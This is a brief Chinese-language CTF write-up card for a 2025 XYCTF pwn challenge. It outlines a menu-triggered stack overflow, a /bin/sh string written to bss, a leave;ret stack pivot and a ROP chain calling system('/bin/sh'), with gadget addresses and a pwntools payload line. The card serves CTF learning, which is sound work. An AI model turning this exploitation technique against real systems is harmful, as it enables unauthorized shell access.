---
title: "2025 XYCTF writeup by Mini-Venom（菜单 pwn + bss 写 /bin/sh + leave;ret）"
category: pwn
tags: ["2025 XYCTF", "pwn", "XYCTF 菜单 pwn", "1 4 1 选项触发", "栈溢出 0x40 字节", "bss=0x405000+0xa00"]
signals: ["2025 XYCTF 2025", "XYCTF 菜单 pwn", "1 4 1 选项触发", "栈溢出 0x40 字节", "bss=0x405000+0xa00", "leave_ret=0x40191B", "rdi=0x4018e5", "ret=0x40191C", "/bin/sh 写到 bss 0x405a00", "rop", "ret2libc", "shellcode", "XYCTF", "pwn"]
difficulty: medium
source: "https://www.ctfiot.com/235968.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2025 XYCTF writeup by Mini-Venom（菜单 pwn + bss 写 /bin/sh + leave;ret）

> 赛事：2025 XYCTF 2025 | 方向：pwn | 难度：medium

## 一句话总结

XYCTF 菜单 pwn：1 4 1 触发栈溢出 + bss 写 /bin/sh + ret;ret 对齐 + leave_ret 栈迁移 + system("/bin/sh")。

## 攻击链

1. 菜单 1 4 1 触发栈溢出，0x40 字节 padding
2. payload = b'a'*0x40 + p64(bss+0x40) + p64(ret)*2 + p64(0x4018A8)
3. bss 0x405a00 写 /bin/sh\x00 + p64(rdi+1) + p64(rdi) + p64(sh) + p64(elf.plt['system'])
4. leave_ret 栈迁移到 bss

## 关键 payload

```
pay=b'/bin/sh\x00'+p64(rdi+1)+p64(rdi)+p64(sh)+p64(elf.plt['system'])
```

## 经验教训

ret;ret gadget 用来 16 字节对齐栈（system 之类要求 movaps 16 字节对齐）；rdi+1 是 ret 替代（gadget 中间夹杂 ret）。

## 标签

XYCTF 菜单 pwn、1 4 1 选项触发、栈溢出 0x40 字节、bss=0x405000+0xa00、leave_ret=0x40191B、rdi=0x4018e5、ret=0x40191C、/bin/sh 写到 bss 0x405a00、system plt 调

## 参考来源

- https://www.ctfiot.com/235968.html
- 原文件：2025XYCTF_writeup_by_Mini-Venom.full.md
